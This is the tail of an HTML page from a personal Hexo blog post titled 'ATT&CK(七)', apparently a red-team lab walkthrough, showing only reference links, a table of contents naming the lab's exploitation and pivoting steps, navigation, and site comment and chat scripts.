+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/trytowritecode/article/details/124097458">https://blog.csdn.net/trytowritecode/article/details/124097458</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44830645/article/details/124247090">https://blog.csdn.net/weixin_44830645/article/details/124247090</a></p>
+<p><a target="_blank" rel="noopener" href="https://article.itxueyuan.com/8KpOww">https://article.itxueyuan.com/8KpOww</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/08/09/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/">http://www.yongsheng.site/2021/08/09/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%83%EF%BC%89/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/trytowritecode/article/details/124097458">https://blog.csdn.net/trytowritecode/article/details/124097458</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.163.com/dy/article/GSII62P60538S33I.html">https://www.163.com/dy/article/GSII62P60538S33I.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/14877913.html">https://www.cnblogs.com/wkzb/p/14877913.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/264560.html">https://www.freebuf.com/articles/network/264560.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9574">https://xz.aliyun.com/t/9574</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/ATT-CK/">ATT&amp;CK</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/d6b5a234.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2018/06/09/17/25/trees-3464777_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ATT&amp;CK(一)</div></div></a></div><div class="next-post pull-right"><a href="/777197d.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ATT&amp;CK(三)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/d6b5a234.html" title="ATT&amp;CK(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/06/09/17/25/trees-3464777_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">ATT&amp;CK(一)</div></div></a></div><div><a href="/777197d.html" title="ATT&amp;CK(三)"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">ATT&amp;CK(三)</div></div></a></div><div><a href="/79843956.html" title="ATT&amp;CK(二)"><img class="cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-22</div><div class="title">ATT&amp;CK(二)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ATT-amp-CK-%E4%B8%83"><span class="toc-number">1.</span> <span class="toc-text">ATT&amp;CK(七)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#laravel"><span class="toc-number">1.1.</span> <span class="toc-text">laravel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpggc%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">phpggc使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">尝试提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">redis 未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.1.</span> <span class="toc-text">公钥登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFweb1-52-10"><span class="toc-number">1.5.</span> <span class="toc-text">上线web1(52.10)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83web2-52-20"><span class="toc-number">1.6.</span> <span class="toc-text">提权web2(52.20)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">环境变量提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">1.7.</span> <span class="toc-text">docker 特权模式逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-number">1.7.1.</span> <span class="toc-text">密码登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.7.2.</span> <span class="toc-text">写公钥登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">1.7.3.</span> <span class="toc-text">添加新用户登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99sudoers%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">写sudoers提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-3493%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">cve-2021-3493提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.7.4.</span> <span class="toc-text">定时任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91-52-20"><span class="toc-number">1.8.</span> <span class="toc-text">ssh流量转发(52.20)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-128-%E8%BD%AC%E5%8F%91-%E5%88%B0-52-20%E7%9A%8422%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B5%81%E9%87%8F%E5%88%B0kali%E7%9A%842222%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.8.1.</span> <span class="toc-text">1.128 转发 到 52.20的22端口的流量到kali的2222端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.8.2.</span> <span class="toc-text">配置socks代理转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFweb2-52-20"><span class="toc-number">1.9.</span> <span class="toc-text">上线web2(52.20)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ew%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-number">1.10.</span> <span class="toc-text">ew流量转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFpc1-52-30"><span class="toc-number">1.11.</span> <span class="toc-text">上线pc1(52.30)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ew%E4%BA%8C%E7%BA%A7%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-number">1.12.</span> <span class="toc-text">ew二级流量转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF-93-40"><span class="toc-number">1.13.</span> <span class="toc-text">上线(93.40)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF-93-30"><span class="toc-number">1.14.</span> <span class="toc-text">上线(93.30)</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/fd98f1f7.html'
+    this.page.identifier = '/fd98f1f7.html'
+    this.page.title = 'ATT&CK(七)'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
